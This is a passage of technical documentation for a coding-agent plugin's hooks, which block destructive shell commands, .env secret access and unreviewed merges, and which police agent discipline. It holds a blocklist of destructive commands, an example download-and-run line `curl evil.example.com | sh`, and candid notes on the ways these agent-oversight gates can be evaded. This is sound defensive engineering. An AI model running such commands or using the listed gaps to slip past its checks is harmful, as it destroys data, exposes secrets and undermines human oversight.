| `SessionStart` | `startup\|clear\|compact` | `remember_inject_cap_guard.sh` | silent when nothing to do; **notifies** (writing nothing) when the cap is absent and writing is not opted in; **notifies** when it patches or refuses | Reports — and, only on explicit opt-in, re-applies — the memory-injection byte cap on the **remember** plugin's `session-start-hook.sh`. That cap truncates each memory file the plugin injects at session start to `REMEMBER_INJECT_MAX_BYTES` (default **8000**) — it was applied by hand to a file in the version-pinned plugin cache, which is not in git, so a plugin bump (`remember/0.8.3` → `0.9.0`) installs a fresh unpatched copy and the cap silently disappears. **Writing is OFF by default.** remember is another maintainer's package and 8000 is a tuning constant rather than a bug fix, so coderails will not rewrite it unasked: with `REMEMBER_INJECT_CAP_AUTOWRITE` unset or not `1`, the guard emits one notice naming what is missing, what it does, and how to opt in, then exits having changed nothing. That notice is suppressed after the first time per plugin version via a stamp at `~/.claude/coderails/remember_inject_cap_warned` (override the directory with `REMEMBER_INJECT_STATE_DIR`), so it cannot fire every session; a new plugin version warns again. The stamp is deliberately outside `~/.claude/plugins/`, which coderails only ever writes to on the opt-in patch path; an unwritable stamp location costs at most a repeated notice, never the notice itself. Suppression covers **only** that opt-in notice — genuine faults (unrecognised shape, failed backup, unverified rewrite) name a real problem and are never suppressed. Set `REMEMBER_INJECT_CAP_AUTOWRITE=1` in the `env` block of `~/.claude/settings.json` (or a project's `.claude/settings.json`) and the guard re-applies the cap from the canonical text in `hooks/patches/`. **In that mode it is the only coderails hook that writes outside this repo**: it modifies another plugin's file under `~/.claude/plugins/cache/<marketplace>/remember/<version>/scripts/`, and leaves a timestamped `<target>.coderails-bak-<ts>` backup beside it (a single rolling copy — earlier backups are reaped on each successful backup). Target resolution reads `~/.claude/plugins/installed_plugins.json`, preferring the `user`-scoped record and otherwise the highest version by `sort -V`; with no manifest it globs `cache/*/remember/*/` and takes the highest. Neither path can prove which install Claude Code is actually running, so the version named in the notice is best-effort. The patch is a whole-block literal search/replace that must match **exactly once** — 0 or >1 matches means the file's shape is unrecognised, and it refuses to write. The block is scoped to the plugin's `for MFILE ...; do ... done` injection loop **only**, deliberately stopping short of the enclosing `if [ -n "$HAS_MEMORY" ]; then` and its closing `fi`: anchoring on the wider block makes any vendor edit *anywhere* inside that block a false shape mismatch, which is exactly what broke on the 0.8.9 bump (it appended a rotated-archives section between `done` and `fi`, leaving the loop itself byte-identical). The narrower anchor matches 0.8.3 and 0.8.9 with one patch pair. Uniqueness is not free: the vendor runs a near-identical `for MFILE in ...` line earlier to compute `HAS_MEMORY`, differing only by leading indentation, and its body differs on the following line (`[ -f "$MFILE" ]` alone vs `&& [ -s "$MFILE" ]`) — so any re-derivation must re-run the guard's own match counter and confirm the sequence still occurs exactly once. Detection keys on the truncation call (`head -c "$REMEMBER_INJECT_MAX_BYTES"`), not on the bare token, so a stray mention in a comment cannot mask an absent cap. The rewrite is sanity-checked (non-empty, carries the truncation call) before it replaces anything, file mode is preserved, and the swap is a `mv` over a temp file | Silent (exit 0, no write) when: the remember plugin is not installed at all, the cap is already applied, or the opt-in notice for this plugin version has already been shown. Warns without writing when: the cap is absent and `REMEMBER_INJECT_CAP_AUTOWRITE` is not `1` (the default — one notice per plugin version), or the resolved `session-start-hook.sh` is missing/unreadable. In opt-in mode, warns without writing when: the canonical patch text under `hooks/patches/` is absent, the vendor block does not match exactly once, the backup could not be written, the rewrite failed or did not verify, or the swap failed. **Never blocks session start** — fail-open throughout, always exits 0 |
| `UserPromptSubmit` | (all prompts) | `inject_context.sh` | silent | Every user prompt — prepends `[ctx] <date> \| cwd=... \| branch=...` and appends the discipline reminder (tag claims (verified)/(inferred)/(guess), add `## Did Not Verify` after file edits) — the same reminder as `check_confidence_labels.sh`/`check_verify_loop.sh`, surfaced before generation every turn rather than only enforced after it at `Stop` | Never inactive |
| `UserPromptSubmit` | (all prompts) | `crack_on_gate.sh` | silent | When the raw submitted prompt (payload `.prompt`) contains "crack on" (case-insensitive, word-boundary match; hyphenated "crack-on" deliberately excluded), stamps a `crack_on_active` flag file at a session-only path (`<base>/<session_id>/crack_on_active`, base = `$CLAUDE_AGENTIC_LOOP_DIR` or `~/.coderails/agentic-loop`) — deliberately NOT the `agentic_loop_path.sh` resolver, whose existence-probe can resolve to a different dir between stamp and read under slug drift, which would fail unsafe for this gate. Never scans the transcript or injected context (the phrase appears in the `agentic-loop` skill body and injected memory in most sessions, so a transcript scan would false-positive fleet-wide). | Silent (no stamp) when no session_id, no prompt, or the phrase doesn't match |
| `PostToolUse` | `*` | (inline command, no separate script file) | silent | After every tool call, unconditionally injects a fixed `additionalContext` string reminding the model to tag claims (verified)/(inferred)/(guess) and add a `## Did Not Verify` section after file edits — the same discipline reminder as `check_confidence_labels.sh`/`check_verify_loop.sh`, surfaced earlier (turn-end recency) rather than only at `Stop` | Never inactive — runs on every matched tool call unconditionally, no config or state to disable it |
| `Stop` + `SubagentStop` | — | `check_confidence_labels.sh` | **block** outside an active agentic loop; inside one, `Stop`-event violations demote to a model-visible warn | Blocks (exit 2) when the response is ≥200 chars and contains no `(verified)`, `(inferred)`, or `(guess)` label. Inside an active, incomplete agentic loop (per `als_loop_active_incomplete`), a `Stop`-event violation demotes to a model-visible warn instead (`hookSpecificOutput.additionalContext`, exit 0, prefixed `[discipline-warn(loop)]`) — `SubagentStop`/worker output still blocks unconditionally, since a warn at a worker's final stop lands in dead context. On `SubagentStop`, reads `last_assistant_message` directly (skips transcript parse — avoids the parent-transcript flush race and checks the correct message). | Skips for short responses (<200 chars) or when any label is already present. Also skips entirely when `CODERAILS_HEADLESS_RUN=1` — but on the `Stop` event ONLY: a dashboard-spawned `claude -p` run has no interactive human to read a label and no next turn to repair, so a block there would displace the run's answer rather than improve it. `SubagentStop` (worker output) stays block-enforced regardless of headless-run state, consistent with every other demotion branch in this file. Logged `hook=confidence_labels skipped=headless`. Inside the agent trust domain by design, like every local gate — an agent that can set its own environment can set this variable. That ceiling is bounded, not open: per `AGENTS.md`, the variable is set in exactly one place (`skills/dashboard/app/src/app/api/run/route.ts`'s `spawn(...)` call) and must never be set anywhere else, so a second set-site is treated as a security finding rather than a feature; `scripts/sandbox/spawn-sandboxed-worker.sh` force-unsets it when spawning a sandboxed worker so an inherited value cannot leak the exemption into worker sessions |
| `Stop` + `SubagentStop` | — | `check_verify_loop.sh` | **block** outside an active agentic loop; inside one, `Stop`-event violations demote to a model-visible warn | Blocks on either of two independent paths: (a) the response contains a `## Did Not Verify` section with any untagged bullet — policed regardless of whether files were edited this turn; or (b) the current TURN edited ≥3 unique files (`Stop` path only — SubagentStop never computes `file_count`) and the response has no `## Did Not Verify` header at all. Inside an active, incomplete agentic loop, a `Stop`-event violation on either path demotes to a model-visible warn instead (same `additionalContext`/`[discipline-warn(loop)]` idiom as `check_confidence_labels.sh`) — `SubagentStop`/worker output still blocks. On `SubagentStop`, reads `last_assistant_message` directly. `loop_state_guard` and `loop_stall_guard` remain `Stop`-only (loop-state ownership is a parent-session concept; subagents have no `progress.json`). | Skips when: no transcript (Stop-only — on SubagentStop the script reads `last_assistant_message` directly and skips the transcript), already blocked once this turn (`stop_hook_active=true`), no DNV section and turn file_count < 3, or a present DNV section has all bullets carrying the `(unverifiable: <reason>)` tag. Also skips entirely when `CODERAILS_HEADLESS_RUN=1` — but on the `Stop` event ONLY, same rationale and shape as `check_confidence_labels.sh`: no interactive human, and a repair turn would displace the run's answer. `SubagentStop` (worker output) stays block-enforced regardless of headless-run state. Logged `hook=verify_loop skipped=headless`. Inside the agent trust domain by design |
| `Stop` | — | `crack_on_prose_gate.sh` | **block** | The prose half of the crack-on human-ask waiver, sibling to `crack_on_gate.sh`'s `AskUserQuestion` deny: while this session's `crack_on_active` flag is stamped, blocks (exit 2) a final assistant message that hands a QUESTION back to the user in plain text — the evasion where the model asks in prose instead of calling the already-denied tool. Deterministic two-verification_level heuristic, NOT an LLM judge (a judge was considered and rejected for a Stop hook: per-turn latency, a network dependency inside the hook sandbox, and nondeterminism that can't be fixture-tested). Preprocessing drops fenced code blocks, inline backtick spans, and blockquote lines. Verification level 1 (positional): the last content line of the prose body — the text before a trailing `## Did Not Verify` section — or of the whole message ends with `?`; the self-answered rhetorical form carries its answer after the `?` and does not match. Verification level 1b: a whole-line first-person-modal question (`Should I ...?`, `Shall we ...?`) within the last 3 content lines, catching the ask when a structural trailer follows it. Verification level 2 (phrase): ~15 high-precision second-person request phrases anywhere in the prose ("do you want", "let me know which", "would you prefer", "awaiting your"), question mark or not. Fail-closed on discipline (a false positive costs one rewrite; a false negative parks the envelope on a question nobody will answer), fail-open with a log line on infrastructure failure. A per-session counter reset on each turn's first Stop attempt caps blocks at `CLAUDE_CRACK_ON_PROSE_MAX_BLOCKS` (default 3), logged `capped=1` — a deliberate release valve against an infinite rephrase loop; if the counter cannot be WRITTEN the hook fails open rather than risk an uncounted block cycle. `stop_hook_active` is NOT an unconditional allow here (unlike the sibling discipline hooks): a rephrased question on the continuation turn must still be caught, so the counter, not the flag, is the terminator. Agentic-loop hard-stops are untouched — a well-formed `LOOP-STOP: <category> — <reason>` line matches no verification_level, so this gate never prevents stopping-with-a-report, only stopping-with-a-question. **Honest ceiling:** intent has no regex — a declarative handoff with no interrogative marker, a novel second-person phrasing, a question inside plain double quotes (only backtick/fence/blockquote quoting is stripped), and anything past the per-turn cap all pass, audited but not blocked. Same class of ceiling as `destructive_bash_gate`'s pre-expansion regex. | Skips when: no `crack_on_active` flag for this session, no session_id, no transcript, the final message carries no question shape under any verification_level, or the per-turn block cap has already been reached (allowed and logged `capped=1`). `Stop`-only — never registered on `SubagentStop`, since a worker's final message addresses the ORCHESTRATOR rather than the human, and the `SubagentStop` payload carries the parent's session_id, which would spuriously police worker reports against the parent's flag. Also skips entirely when `CODERAILS_HEADLESS_RUN=1`. Same rationale as the two sibling discipline hooks above — a dashboard-spawned `claude -p` run has no interactive human, and a repair turn would displace the run's answer — and the same `Stop`-only scope, reached differently: the exemption block itself carries no `hook_event` test, because the script already hard-exits on any non-`Stop` event at its own top (`[ "$event" = "Stop" ] \|\| exit 0`), several lines above. The `Stop`-only guarantee is therefore in-script and holds regardless of how `hooks.json` registers this hook. Logged `hook=crack_on_prose_gate skipped=headless` |
| `Stop` | — | `voice_announce.sh` | **observe-only** (always exits 0) | Speaks a macOS `say` announcement for the stopping turn's outcome when an agentic loop is active: `complete` when `LOOP-STOP: complete` is declared, waiting-on-human when `approval-gate` or `awaiting-input` is declared, stopped when `hard-stop` is declared, or stall when text was successfully extracted but carries no valid `LOOP-STOP` declaration. `say` is launched backgrounded and detached so the hook returns immediately. Debounced per session and per announcement kind (state kept alongside `progress.json`, never the repo); a debounce-marker write failure still announces (fails open toward speaking) but logs a distinct reason. Runs FIRST in the `Stop` array — observe-only and always exit-0, so its position cannot affect any other gate's decision, but placing it after a blocking hook risks the runner short-circuiting before it runs. | Silent (zero `say` calls) when: no transcript, `stop_hook_active=true`, no `agentic-loop` Skill invocation in the transcript, loop is complete and not re-armed, the same announcement kind was already spoken within the debounce window, or stable text extraction itself came back empty (logged as `reason=extract_failed` — NOT treated as a stall) |
| `Stop` | — | `loop_state_guard.sh` | **block** | Blocks when an agentic-loop Skill was invoked this session AND `progress.json` is absent, belongs to a different session, or is stale-complete after a rearm. Also gates loop-scope evals: when `progress.json`'s `work_units` field reports ≥3 units, blocks if no loop-scope `evals.json` is found beside it (or if found but graded `NO-GO`/`UNJUSTIFIED`/`UNSTAMPED` — the latter meaning `result` is `GO`/`VERIFICATION_LEVEL0` but lacks a valid `post_evals.sh grade-loop` provenance stamp); fails open (no block) when `work_units` is absent. | Inactive (skips) when: no transcript, `stop_hook_active=true`, no `agentic-loop` Skill invocation in the transcript, loop is genuinely complete and not re-armed for the current session, or — absent-`progress.json` case only — `als_gate_unstubbed_grace` has already delivered one absent-block for this session at the current invocation count (session-mismatch and stale-complete-after-rearm carry no such grace) |
| `Stop` | — | `loop_stall_guard.sh` | **block** | Blocks when an active (non-complete) agentic loop is running and the stopping turn carries no valid `LOOP-STOP: <hard-stop\|approval-gate\|awaiting-input\|complete> — <reason>` declaration. Additionally blocks a `complete` declaration on any of three independent gates: (1) retro.json is absent, malformed, or below schema_version 1 (accepts schema_version >= 1) beside progress.json — currently schema_version 2, carrying cost/models_used (Phase 13 retro write contract); (2) any progress.json work_unit is not terminal (`done`, or `dropped` with a non-empty `dropped_reason`) — the deferral gate; (3) a sibling proof.json exists and any of its frozen proofs is unexecuted-in-this-session's-transcript or last-failed, mined via exact trimmed-command match against Bash tool_use/tool_result pairs (foreground calls only) — the proof gate, fails open when proof.json itself is absent. proof.json may also carry a `withdrawn_proofs` array (a proof withdrawn instead of fixed): each entry blocks unless the SAME transcript mining shows its `cmd` was run and its last result was an observed failure (`is_error: true` — unlike `.proofs`, a null/false result does not pass), it carries a non-empty `withdrawn_reason`, and its `id` doesn't also appear in `.proofs`; `.proofs` and `withdrawn_proofs` share a combined cap of 100 entries, checked before any transcript mining. Separately, and NEVER blocking: on a `complete` declaration `als_report_cost_on_complete` PRINTS the loop's cost to the human via a top-level `systemMessage` (USD + tokens + price-staleness age, read from `retro.json`'s `cost` field after the three gates above have passed). It is a reporter, not a gate — every path returns 0, deliberately inverting this file's fail-toward-blocking idiom, because the cost miner fails open to `{}` by contract and a blocking reporter would deadlock an already-finished loop. Silent only on a legacy `schema_version < 2` retro (pre-cost-miner); a `{}`, absent, incomplete, or wrong-typed `cost` all still print an honest message naming which, never a fabricated figure. The price table (`hooks/scripts/lib/model_prices.json`) is HAND-MAINTAINED — no pricing API exists, so nothing auto-updates it; past `ALS_PRICE_STALE_DAYS` (14) days, the reporter also appends a nag to go check the rates, without suppressing the cost figure. The nag checks the DATE only, never the rates themselves — a stale-but-untouched date can't prove the rates are wrong, only that nobody has re-verified them recently | Inactive (skips) when: no transcript, `stop_hook_active=true`, no agentic-loop invocation, loop is complete and not re-armed, a valid LOOP-STOP declaration is present in the last response (a `complete` declaration is the one exception — it still blocks if any of the three complete-only gates above fails; the cost reporter never blocks), or — absent-`progress.json` case only — `als_gate_unstubbed_grace` finds a prior delivered `loop_state_guard` absent-block for this session at the current invocation count (the grace is keyed off `loop_state_guard`'s log line, not this hook's own, so `loop_stall_guard` stands down only after `loop_state_guard` has already nagged once at that same count) |
| `Stop` | — | `unregistered_loop_guard.sh` | **nudge** (never blocks) | Injects an `additionalContext` nudge when the session is dispatch-heavy (≥3 distinct Agent-dispatch turns, counted by unique assistant `message.id`) with no `progress.json` at the resolved path and no `agentic-loop` Skill invocation anywhere in the transcript — the heuristic proxy for "orchestrator forgot to register the loop." Sibling to `loop_state_guard`/`loop_stall_guard`, not an extension: those answer "is a *registered* loop's `progress.json` present and healthy" (ground-truth, blockable); this one answers "does this *unregistered* session look like a loop that should have registered" (heuristic, nudge-only). | Skips (silent, no nudge) when: no transcript, dispatch turns < 3, `progress.json` already present at the resolved path, or an `agentic-loop` Skill invocation is found in the transcript |
| `Stop` + `SubagentStop` | — | `offload_push_guard.sh` | **nudge** (never blocks) | Injects an `additionalContext` nudge when the final assistant text both names a `git push` targeting a repo's `main`/`master` AND carries an offload-to-user cue (a leading `! ` run-it-yourself prefix, or phrasing like "your own shell", "run this yourself", "from your shell", "you run", "needs your shell", "un-gated shell") — the case where an agent tells the user to run a push that `enforce_pr_workflow.sh`'s gate would let the session clear itself by running `/pr-review-toolkit:review-pr` first. On `SubagentStop`, reads `last_assistant_message` directly (same rationale as `check_confidence_labels.sh`). Nudges at most once per session (ledger keyed on the discipline log, same idiom as `unregistered_loop_guard.sh`). | Skips (silent, no nudge) when: no transcript/no `last_assistant_message`, empty final text, no push-to-main/master token found, no offload cue found, or this session already received the nudge |
| `PreToolUse` | `Bash` | `destructive_bash_gate.sh` | **block** | Permanent blocklist: `rm -rf`, `git push --force`/`-f` (naked; see force-with-lease carve-out below), `git reset --hard`, SQL `DROP TABLE/DATABASE/SCHEMA` and `TRUNCATE TABLE`, `dd if=`, `mkfs.*`, `chmod -R 777`, `git commit --no-verify`, `git clean -f/--force`, `find -delete/--delete`, `truncate -s/--size`, `shred`. **`.env` secret-file access** (RCA item 12): any Bash command naming a `.env` file is denied, read or write — the detector matches the `.env` PATH TOKEN rather than enumerating reader/writer verbs, since a verb list is unbounded and every omission is a silent bypass. Both boundaries are INVERTED rather than enumerated: a boundary is any character that is not a filename character, so an unforeseen metacharacter cannot open a new hole. (The previous form listed the permitted separators, and 18 of 19 tested left-boundary characters let a command through.) The left class excludes `[alnum _ -]`, so `./.env`, `../.env`, `/abs/.env`, `>.env`, `VAR=.env`, `#.env#` all match while `myapp.env` and `config.env` stay allowed by their preceding filename character; the right class also excludes `.`, so `.env.example` falls through to the template branch instead of being denied outright. A second predicate covers glob expansion: matching runs before the shell expands anything, so `cat .en?`, `cat .e*v` and `cat .en[v]` contain no literal `.env` substring at all yet each expands to exactly the real file. That predicate denies a token only when its literal, non-metacharacter characters COMMIT to the `.env` shape — a leading dot at a boundary, then a non-empty prefix of `env`, then a glob metacharacter — which is what keeps bare globs (`cat *`, `ls .*`, `echo *`) allowed; a naive "could this glob match `.env`" test was measured to deny 3 of 15 ordinary commands. `.envrc*` stays allowed because `envrc` is not a prefix of `env`, and `myapp.env*` because a filename character precedes the dot. The right boundary also excludes word characters — which is what keeps `.envrc` (direnv) allowed — but does include the editor-backup markers `~` and `#`, so `.env~` (vim) and `#.env#` (emacs autosave) are denied alongside the original they copy. The whole line is lowercased before matching, because macOS (APFS) and Windows are case-insensitive by default and `.ENV` therefore opens the same file as `.env`; the template allow-list is compared against that lowercased form too, so `.ENV.EXAMPLE` stays allowed rather than being over-blocked. Suffixed forms (`.env.local`, `.env.production`) are handled by a separate bash-side branch because "deny `.env.<suffix>` except the templates" is a negative lookahead POSIX ERE cannot express; only the FIRST suffix segment is compared, so `.env.example.md` is allowed while `.env.local.bak` is denied. Template suffixes `example`, `sample`, `template`, `dist` are allowed. Ceilings: a template suffix off that list (`.env.tpl`) denies (fails closed), a real secret misnamed as a template is allowed (naming is the only signal), a variable-held path (`F=.env; cat "$F"`) is uncaught, same class as the existing "variable filenames remain uncaught" ceiling below, glob patterns whose literal characters COMMIT to the `.env` shape are now denied (`cat .env*`, `cat .en?`, `cat .e*v`, `cat .en[v]`), including forms where a committing character is wrapped in a single-character bracket group (`.[e]nv`), which are collapsed to their literal before matching; but a pattern whose literal characters stay ambiguous until expansion is still uncaught — `.??v`, `.??[v]`, or a bare `*` in a directory whose only file is the secret — and cannot be caught without over-blocking ordinary globs, and admitting `#` as a boundary means any literal `#.env` on the line denies — including a URL fragment like `http://host#.env` — which over-blocks (fails closed) on input no real workflow emits. Also blocks in-Bash source-file edits (`sed -i`, `perl -i`, `>` / `>>` redirects, `tee`, `cp`/`mv`/`dd of=`) targeting source extensions (`.py`, `.ts`, `.tsx`, `.js`, `.jsx`, `.go`) or plugin markdown (`skills/*/SKILL.md`, `commands/*.md`) when the file's repo is on main/master (best-effort; variable filenames, quoted paths with spaces, `python -c` writes remain uncaught). Denies backtick, `$(...)`, and process-substitution `<(...)`/`>(...)` inside a `push.sh`/`merge.sh`/`post_review.sh`/`post_evals.sh` free-text argument (message/title/body), since those scripts interpolate the argument into a commit message, PR title, or comment body where a substitution character executes live; a narrow prose exemption allows a single quoted mention of the script name with no substitution elsewhere on the line. **`git push --force-with-lease` conditional allow**: naked `--force`/`-f` (including combined short-flag clusters like `-uf`) is always denied even alongside `--force-with-lease` on the same line, but a *clean* `--force-with-lease` with no naked force present is allowed if `.claude/destructive_allowlist` (resolved against the command's own repo root, gitignored/local-only) contains the exact line `git-push-force-with-lease`; missing/empty/garbage allowlist file denies (fails closed). Global git options between `git` and `push` (`-c`, `-C`, `--no-pager`, etc.) don't defeat detection. | Skips when no Bash command is detected or when the command matches none of the patterns. There is NO general approval path for anything else on the blocklist — the only escapes are the narrow `git push --force-with-lease` allowlist opt-in described above, or adding a `settings.json` Bash permission rule |
| `PreToolUse` | `Bash` | `enforce_pr_workflow.sh` | **block** | Blocks `gh pr create` unless `/coderails:push` ran this session; blocks `gh pr merge <N>` unless `/pr-review-toolkit:review-pr <N>` ran this session (per-PR, consume-on-use — the PR number must match); ALSO blocks `gh pr merge <N>` unless a SHA-bound `GO` coderails eval artifact exists for the PR's current head (fail-closed — any verification_level 0/1/2 `GO` satisfies it, mirroring `scripts/merge.sh`'s eval gate); blocks `git merge` on main/master unless `review-pr` ran since the last `git merge`; blocks `git push` to main/master (current branch, colon refspec `HEAD:main`, or positional bare branch token `git push origin main`) unless `review-pr` ran this session. `scripts/merge.sh <N>` (path-prefixed, `bash`/`sh`-prefixed, or quoted) is recognised as the same gated `merge` subcommand as `gh pr merge <N>` — identical review-pr + eval-artifact checks apply; PR-number extraction is scoped to the matched command segment, not the raw command string, closing a decoy-PR-number hijack across shell chains. Scans `agent_transcript_path` in addition to `transcript_path` for subagent context. `git merge-base`/`merge-file`/`merge-tree` (read-only plumbing) excluded; `--abort`/`--continue`/`--quit`/`--skip` exempt; the `--dry-run`/`--help` passthrough does NOT extend to `merge.sh` (its arg parser reads only the first positional argument and silently ignores trailing flags, so exempting it would let a real merge proceed ungated). Once the eval-artifact gate has passed, `gate_integrity_status` additionally requires a successful `integrity-review` status on the exact head SHA, posted by the configured `integrity_review.machine_user` login and carrying `integrity=pass sha=<head>`. Missing, stale, malformed, non-success, wrong-creator, or unfetchable status blocks with a named remedy. | **Opt-in only**: inactive (skips) when no `workflow.config.yaml` exists (`NO_CONFIG`). Also skips for `--help`/`--dry-run` on the `gh`/`git` forms only. Escapable by adding a Bash permission to `settings.json` |
| `PreToolUse` | `Bash` | `test_gate.sh` | **block** | Blocks `git commit` if the project has `.claude/test_command` and the tests fail | **Opt-in only**: completely inactive unless `.claude/test_command` exists in the project. Set up via `/coderails:test-gate-setup` |
| `PreToolUse` | `Bash` | `verification_volume_ceiling.sh` | **block** | Hard-blocks the 3rd+ invocation, per work-unit, of `hooks/scripts/tests/run_all.sh` (any invocation counts) or a `scripts/post_evals.sh` ceremony (counted via its `validate-structure` subcommand only — the ceremony's first, once-per-run step; `compute-result`/`validate-discriminating`/`validate-embed` are never counted, since a normal ceremony invokes those legitimately more than twice). Matched on invocation shape (command start, or after `&&`/`;`/`\|`/newline, optional `bash`/`sh`/`./` prefix) so a `grep`/`cat`/`echo` that merely mentions either script path never counts. Work-unit key is the command's cwd's current git branch (one branch = one work-unit); detached HEAD or a non-repo cwd falls back to a shared `(no-branch)` bucket rather than silently no-op'ing. Counter is a small per-`(branch, target)` file under the loop-state dir (`hooks/scripts/lib/agentic_loop_path.sh`'s base, respecting `CLAUDE_AGENTIC_LOOP_DIR`), never inside the code repo; a fresh branch starts at 0. No override — hard block, by design. | Skips when no Bash command is detected or the command matches neither target's invocation shape |
| `PreToolUse` | `Write\|Edit\|MultiEdit` | `no_edit_on_main.sh` | **block** | On main/master, blocks edits to ANY file EXCEPT an explicit allowlist: `.md`/`.txt`/`.rst` (plain docs), `.yaml`/`.yml`/`.json`/`.toml`/`.ini`/`.cfg` (config), the literal `.gitignore` dotfile (by basename — not `deploy.gitignore`), and `LICENSE`. Plugin source markdown (`skills/*/SKILL.md`, `commands/*.md`) is also blocked (treated as source, not docs) when the file's repo carries `.claude-plugin/plugin.json`. Both the gated-ness and the branch check key off the **file's own repo**, not the session cwd. | Skips for allowlist files, for non-`main`/`master` branches, and for a sibling **non-plugin** repo's lookalike `commands/`/`skills/` markdown (e.g. the wiki — no marker, so never gated). Escapable by creating a feature branch first, or by adding a `Write`/`Edit` permission rule to `settings.json` |
| `PreToolUse` | `Write\|Edit\|MultiEdit` | `comment_citation_gate.sh` | **block** | Blocks Write/Edit/MultiEdit content (`new_string`/`content`/`edits[].new_string`) that adds a comment citing a session-artifact label — `E#:`, `F# fix`/`:`/`design`, `CHANGE B#`/`C#`, `Task A#`, `TA-I#`, "reviewer finding", `eval E#`, `WU#:`, `C2`, or "per the plan/design/session" — instead of stating the constraint the code enforces. `PR #NN` is a documented survivor (resolves to a durable, checkable GitHub artifact) so it is not matched. | Skips entirely for `.md` files (markdown is out of scope); skips when no citation-shaped label is found in the new content; fails open on malformed/missing input |
| `PreToolUse` | `Write\|Edit\|MultiEdit` | `wiki_taxonomy_gate.sh` | **block** | Blocks a write into an LLM wiki vault's top-level directory that isn't sanctioned by the plugin's own `AGENTS-wiki-schema.md` "## Page types" section (not a file inside the vault). Inert until `.claude/workflow.config.yaml` exists at the plugin root — gitignored and absent on a fresh clone, so this gate only enforces once `/coderails:init` has scaffolded it. The taxonomy is parsed from that section at run time, never hardcoded, so editing the section changes enforcement with no hook edit. A repo counts as the vault only by POSITIVE identification: `wiki_path` is resolved from the plugin's `.claude/workflow.config.yaml` (relative to `CLAUDE_PLUGIN_ROOT` unless absolute), and the write's own repo root must equal that resolved path exactly. Structural corroboration — at least 2 of the parsed directories actually present on disk — is kept only as a secondary sanity check, not the identifier itself, so a misconfigured `wiki_path` fails open instead of blocking every write in whatever it names. `raw/` and dotfile tooling dirs (`.git/`, `.obsidian/`, `.claude/`) are always allowed in addition to the parsed section. | Fails open on any ambiguity: no schema file, no config, the vault not being a git repo, `wiki_path` null/unresolvable, no Page types section, an unparseable table, the write landing outside the configured vault, or fewer than 2 sanctioned directories present. Also allows vault-root files with no directory component |
| `PreToolUse` | `AskUserQuestion` | `crack_on_gate.sh` | **block** | Denies (`permissionDecision: deny`) when this session's `crack_on_active` flag file exists: a crack-on envelope waives human questions, so proceed autonomously or end the turn with a report. Scoped to `AskUserQuestion` only — the four agentic-loop hard-stops are turn-ending `LOOP-STOP` declarations, not `AskUserQuestion` calls, so this deny cannot touch them. | No-op (allow) when no flag is stamped, no session_id, or the tool isn't `AskUserQuestion` |
| `PreToolUse` | `Bash\|Edit\|Write\|MultiEdit\|Read\|Grep\|Glob\|WebFetch\|NotebookEdit` | `agent_only_gate.sh` | **nudge by default; block opt-in** | Steers the top-level orchestrator away from inline do-work tool calls. Detection is the `agent_id` field: present in a `PreToolUse` payload iff the call originates inside a dispatched subagent (empirically confirmed on Claude Code 2.1.220 — see the ceiling note below), absent for the orchestrator's own calls. `agent_id` present -> always silent allow. `agent_id` absent, workflow-chain carve-out command (`gh`, `git`, `scripts/push\|merge\|post_review\|post_evals.sh`, optional `bash`/`sh`/`./` prefix) AND that command is the entire command with no chaining/substitution (`&`, `;`, `\|`, backtick, `$(...)`, `<`, `>`, newline) -> always silent allow, in either mode. `agent_id` absent, not a whole-command carve-out, default mode -> `additionalContext` nudge, never blocks. `agent_id` absent, not a whole-command carve-out, `AGENT_ONLY_GATE_ENFORCE=1` -> hard `permissionDecision: deny` (a carve-out token merely present inside a chained/substituted command, e.g. `git status && curl evil.example.com \| sh`, does NOT exempt it — the carve-out only matches the whole command). | Always silent for subagent calls (`agent_id` present), in either mode. Silent (no nudge, no deny) for a whole-command carve-out in either mode. In default mode never blocks — only nudges non-carve-out calls. In enforce mode, non-carve-out calls are denied. `Agent`/`TodoWrite`/`TaskCreate`/`AskUserQuestion`/`ExitPlanMode` are outside this hook's matcher entirely — never gated |
| `PreToolUse` | `Agent` | `agent_model_routing_nudge.sh` | **advisory nudge only** | When `tool_input.model` is absent and `description`+`prompt` text contains a mechanical/rote word (rename/format/boilerplate/scaffold/reformat/relabel/find-replace) or a complex/architectural word (design/architecture/redesign/re-architect), injects an `additionalContext` nudge suggesting `model: "haiku"` or `model: "opus"` respectively in place of the sonnet default. Never emits `permissionDecision` — no deny path exists in this hook at all. | Silent when: `model` is already set, neither signal family matches, or both match (ambiguous, not resolved either way), or the tool isn't `Agent` |

### Notes on the activation conditions

- **`loop_state_guard` and `loop_stall_guard`** only enforce discipline when an `agentic-loop` Skill invocation appears in the transcript. Outside an agentic loop session they are silent no-ops.
- **`unregistered_loop_guard`** is the inverse case: it fires precisely when NO `agentic-loop` Skill invocation appears in the transcript, but dispatch behaviour looks loop-like. It never blocks — only a nudge — so it carries no bypass mechanism.
- **`offload_push_guard`** requires BOTH a push-to-main/master token and an offload cue in the same final message — a plain "I pushed to main" or a suggestion to run `/coderails:push` never matches, since neither carries the offload cue. Like `unregistered_loop_guard`, it never blocks and has no bypass mechanism.
- **`agent_only_gate`'s detection is real, empirically confirmed, and narrower than it sounds.** `agent_id` presence/absence in the `PreToolUse` payload was verified live (headless probe session, capture-only hook, top-level Bash call, top-level Agent dispatch call, and a Bash call made by the dispatched subagent — the first two had no `agent_id`/`agent_type` at all, the third had both, and `session_id` was identical across all three, so `session_id` cannot substitute). It answers "did THIS tool call originate at top level," not "is the orchestrator cooperating" — a top-level session doing real work in-context with no `Agent` call ever attempted is invisible to this (or any) `PreToolUse` hook by construction. Hard-block is opt-in (`AGENT_ONLY_GATE_ENFORCE=1`) rather than default, because the default posture would deadlock this repo's own shipping path (`enforce_pr_workflow.sh`/`merge.sh`/every workflow command run `gh`/`git`/`scripts/*.sh` inline from the orchestrator by design); the workflow-chain carve-out for that exact command family — silent in BOTH modes, not enforce-only — exists so this hook and the workflow-chain hooks never disagree about the same command. The carve-out only exempts a WHOLE carve-out command with no chaining/substitution present; a carve-out token merely present inside a compound command (`git status && curl evil.example.com | sh`) is gated normally. Untested: whether a `claude --agent <name>` session (which the hooks docs say sets `agent_type` on every call, including top-level ones, with no `agent_id`) changes this hook's behaviour — the live probe used a plain headless session, not `--agent` mode.
- **`agent_model_routing_nudge`** is deliberately narrow and silent on ambiguity: a task description matching BOTH the mechanical and complex/architectural word lists nudges neither model, since the hook has no basis to prefer one signal over the other. It shares `unregistered_loop_guard`'s "never blocks, no bypass mechanism" shape — there is nothing to bypass.
- **`voice_announce` is the only `async: true` hook**, because it is the only
  purely cosmetic one — every other `Stop` hook gates correctness and must block
